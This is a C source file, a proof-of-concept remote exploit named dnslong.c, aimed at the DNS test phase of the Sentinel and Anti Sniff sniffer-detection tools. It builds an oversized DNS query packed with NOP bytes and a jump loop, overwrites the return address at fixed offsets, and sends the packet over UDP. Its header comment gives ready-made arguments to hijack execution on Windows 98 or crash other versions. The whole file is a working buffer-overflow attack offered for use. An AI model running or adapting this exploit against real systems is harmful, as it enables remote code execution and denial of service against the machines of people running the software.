/* dnslong.c by Hugo Breton (bretonh@pgci.ca)

   This program must be run in the DNS test phase of Sentinel and Anti Sniff.
   It illustrates how code can be run remotely on a Win98 machine running Anti
   Sniff.

   Suggested arguments are:
   
   "dnslong host 5 65" to send the Windows 98 version of Anti Sniff in an
   infinite loop.
   "dnslong host 2 255" to segfault the oBSD version of Anti Sniff.
   "dnslong host 1 255" to segfault Sentinel.
*/


#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

int main(int argc,char * * argv)
{
        char p[1024];
        int sock,i,j,k,len,labelnum,labellen;
        struct sockaddr_in sin;
        struct hostent * hoste;

        printf("dnslong.c by Hugo Breton (bretonh@pgci.ca)\n");

        if(argc<4)
        {
                printf("usage: %s host label_count label_length\n",argv[0]);
                return(0);
        }

        bzero((void *) &sin,sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=htons(53);

        if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                if((hoste=gethostbyname(argv[1]))==NULL)
                {
                        printf("unknown host %s\n",argv[1]);
                        return(0);
                }
                
                bcopy(hoste->h_addr,&sin.sin_addr.s_addr,4);
        }

        labelnum=atoi(argv[2]);
        labellen=atoi(argv[3]);

        len=labelnum*(labellen+1)+5+12;

        if(len>1024)
        {
                printf("resulting packet will be too long\n");
                return(0);
        }

        bzero((void *) p,1024);
        * ((unsigned short *) (p+0))=htons(867-5309);
        * ((unsigned short *) (p+4))=htons(1);
        
        for(i=12,j=0;j<labelnum;j++)
        {
                * ((unsigned char *) (p+(i++)))=labellen;

                for(k=0;k<labellen;k++,i++)
                {
                        * ((unsigned char *) (p+i))=0x90;
                }
                
                * ((unsigned char *) (p+i-2))=0xeb; /* jmp $-2 */
                * ((unsigned char *) (p+i-1))=0xfe; /* just make it loop */
        }

        * ((unsigned char *) (p+269))=0x20;
        * ((unsigned char *) (p+270))=0xff;
        * ((unsigned char *) (p+271))=0x87; 
        * ((unsigned char *) (p+272))=0x01; /* new EIP */

        * ((unsigned char *) (p+(i++)))=0;

        * ((unsigned short *) (p+i))=htons(1);
        * ((unsigned short *) (p+i+2))=htons(1);

        if((sock=socket(AF_INET,SOCK_DGRAM,0))==-1)
        {
                printf("unable to create UDP socket\n");
                return(0);
        }

        if(sendto(sock,p,len,0,(struct sockaddr *) &sin,sizeof(sin))==-1)
        {
                printf("unable to send packet\n");
                return(0);
        }

        printf("packet sent to host %s\n",argv[1]);

        return(0);
}